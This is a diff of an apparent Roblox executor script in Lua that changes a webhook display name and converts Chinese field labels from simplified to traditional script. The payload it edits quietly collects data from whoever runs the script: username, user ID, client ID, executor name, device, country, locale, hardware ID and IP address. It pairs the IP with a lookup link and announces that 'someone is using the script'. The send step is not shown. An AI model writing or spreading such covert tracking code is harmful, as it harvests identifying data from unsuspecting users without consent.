@@ -1135,7 +1135,7 @@ local userId = localPlayer.UserId
 local placeId = game.PlaceId
 
 local payload = {
-    username = "机器人",
+    username = "老六",
     embeds = {{
         color = tonumber("0x32CD32"),
         title = string.format("有人正在使用脚本 %s %d时%d分", 
@@ -1146,25 +1146,25 @@ local payload = {
         thumbnail = {url = getAvatarImage(userId)},
         
         fields = {
-            {name = "用户名", value = localPlayer.Name, inline = true},
-            {name = "显示名称", value = localPlayer.DisplayName, inline = true},
-            {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
+            {name = "用戶名", value = localPlayer.Name, inline = true},
+            {name = "顯示名稱", value = localPlayer.DisplayName, inline = true},
+            {name = "用戶ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
             
-            {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
+            {name = "客戶端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
             
-            {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
-            {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
+            {name = "地圖ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
+            {name = "地圖名稱", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
             
             {name = "注入器", value = getExecutor(), inline = true},
-            {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
+            {name = "帳號年齡", value = string.format("%d天", localPlayer.AccountAge), inline = true},
             
-            {name = "设备", value = getDeviceType(), inline = false},
-            {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
-            {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
+            {name = "設備", value = getDeviceType(), inline = false},
+            {name = "國家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
+            {name = "語言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
            
             {name = "HWID", value = getHWID(), inline = true},
             {name = "IP地址", value = getIPAddress(), inline = true},
-            {name = "IP查询", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
+            {name = "IP查詢", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
         }
     }}
 }
